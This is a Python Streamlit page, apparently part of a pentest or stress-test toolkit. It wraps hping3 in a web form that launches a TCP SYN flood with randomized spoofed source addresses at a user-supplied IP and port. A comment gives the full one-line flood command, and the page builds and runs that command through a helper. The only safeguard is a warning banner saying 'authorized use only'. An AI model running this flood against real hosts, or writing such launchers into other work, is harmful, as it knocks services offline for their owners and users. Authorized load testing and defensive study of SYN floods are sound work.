# File: pages/03_🔥_DoS_Simulation.py
import streamlit as st
from utils import run_command # Importing the engine we made earlier

st.set_page_config(page_title="DoS Simulation", page_icon="🔥")

st.header("🔥 TCP SYN Flood Simulation (hping3)")
st.warning("⚠️ AUTHORIZED USE ONLY: This module performs a stress test. Ensure you have permission.")

# --- INPUTS ---
col1, col2 = st.columns(2)
with col1:
    target_ip = st.text_input("Target IP", "192.168.88.252")
with col2:
    target_port = st.text_input("Target Port", "3000")

# Optional: Let user adjust the count or keep your default
packet_count = st.number_input("Packet Count", min_value=1000, value=15000)

# --- THE SCRIPT EXECUTION ---
if st.button("🚀 Launch Stress Test"):
    if not target_ip:
        st.error("Target IP is required.")
        st.stop()

    # ---------------------------------------------------------
    # HERE IS YOUR SCRIPT TRANSLATED INTO PYTHON
    # Original: hping3 --count 15000 --data 120 --syn --win 64 -p 42000 --flood --rand-source <IP>
    # ---------------------------------------------------------
    
    command = [
        "hping3",
        "--count", str(packet_count),  # 15000
        "--data", "120",
        "--syn",
        "--win", "64",
        "--flood",
        "--rand-source",
        "-p", target_port,            # 42000 in your example, or user input
        target_ip                     # xx.xx.xx.xx
    ]

    # Run the command using the utils engine
    run_command(command)
